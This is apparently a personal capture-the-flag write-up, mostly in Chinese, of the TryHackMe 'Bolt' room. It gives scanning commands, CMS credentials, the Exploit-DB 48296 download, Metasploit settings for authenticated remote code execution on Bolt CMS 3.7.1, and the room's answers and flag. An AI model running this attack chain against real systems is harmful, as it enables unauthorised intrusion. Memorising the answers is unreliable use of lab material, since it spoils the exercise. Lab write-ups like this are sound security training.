---
title: Bolt (Try Hack Me Writeup)
date: 2021-08-06T23:56:00+08:00
draft: false
url: "/2021/08/06/bolt-try-hack-me-writeup/"
categories:
  - 滲透測試
  - Try Hack Me
showToc: true
TocOpen: false
---

> 
URL : https://tryhackme.com/room/bolt

IP : 10.10.51.13

## Recon

- `rustscan -a 10.10.51.13`![](/uploads/2022/02/39232-rbBcQvt.png)
- 發現有開22
- 80
- 8000`nmap -A -p22,80,8000 10.10.51.13`- ![](/uploads/2022/02/5ee33-CeiD0Rn.png)觀察網頁- 80![](/uploads/2022/02/a6e81-rhs8G5g.png)8080- ![](/uploads/2022/02/c7f20-O89E4in.png)What port number has a web server with a CMS running?- 8000What is the username we can find in the CMS?- ![](/uploads/2022/02/b8b78-uuS49nr.png)
- `bolt`What is the password we can find for the username?- ![](/uploads/2022/02/785c5-uYjlWzV.png)
- `boltadmin123``python3 dirsearch.py -u http://10.10.51.13:8000/ -e all`- `http://10.10.51.13:8000/.htaccess`裡面沒什麼特別網路上找到後臺網址- http://10.10.51.13:8000/bolt/login
- ![](/uploads/2022/02/96b39-ObFh4vj.png)What version of the CMS is installed on the server? (Ex: Name 1.1.1)- `Bolt 3.7.1`
- 上一張截圖最下面有寫Google `Bolt 3.7.1 Exploit`- https://www.exploit-db.com/exploits/48296
- `wget https://www.exploit-db.com/download/48296 -O 48296.py`There's an exploit for a previous version of this CMS, which allows authenticated RCE. Find it on Exploit DB. What's its EDB-ID?- 48296
- 不知道為什麼，我 run 起來失敗QQ網路上找到另外一組 exploit- https://medium.com/@foxsin34/bolt-cms-3-7-1-authenticated-rce-remote-code-execution-ed781e03237b
- ![](/uploads/2022/02/c120a-W26KDy6.png)
- 他莫名的把我的密碼改成 `password` 了
- 但是也沒有用 ?__?改用 msf- `search bolt`![](/uploads/2022/02/75538-XTxmdaA.png)找到了第 0 個 RCE 的`use 0``set PASSWORD password``set USERNAME bolt``set RHOSTS 10.10.51.13``set LHOST tun0``show options`![](/uploads/2022/02/d8822-zIX4Qdc.png)`exploit`- ![](/uploads/2022/02/66e66-hcny3lE.png)
- ![](/uploads/2022/02/3e5ba-Vdxp4Rd.png)成功 RCE 取得 flag- ![](/uploads/2022/02/6b0f2-z8huKEP.png)
- `THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}`
